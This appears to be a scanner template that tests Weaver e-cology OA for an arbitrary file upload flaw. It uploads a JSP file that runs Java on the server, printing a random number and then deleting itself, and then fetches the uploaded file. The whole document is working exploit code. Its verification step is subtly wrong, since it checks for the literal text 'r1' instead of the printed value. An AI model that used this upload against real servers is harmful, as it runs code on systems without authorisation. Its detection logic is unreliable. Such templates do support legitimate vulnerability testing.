cve-id: ecology-weaver-oa-arbitrary-fileupload
set:
  r1: randomLowercase(4)
  r2: randomInt(40000, 44800)
rules:
  - method: POST
    path: /page/exportImport/uploadOperation.jsp
    headers:
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFy3iNVBftjP6IOwo
    body: |-
      ------WebKitFormBoundaryFy3iNVBftjP6IOwo
      Content-Disposition: form-data; name="file"; filename="{{r1}}.jsp"
      Content-Type: application/octet-stream
      <%out.print({{r2}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
      ------WebKitFormBoundaryFy3iNVBftjP6IOwo--
    expression: response.status == 200
  - method: GET
    path: '/page/exportImport/fileTransfer/{{r1}}.jsp'
    expression: response.status == 200 && response.body.bcontains(b"r1")
severity:
  critical
type: 
  fileupload
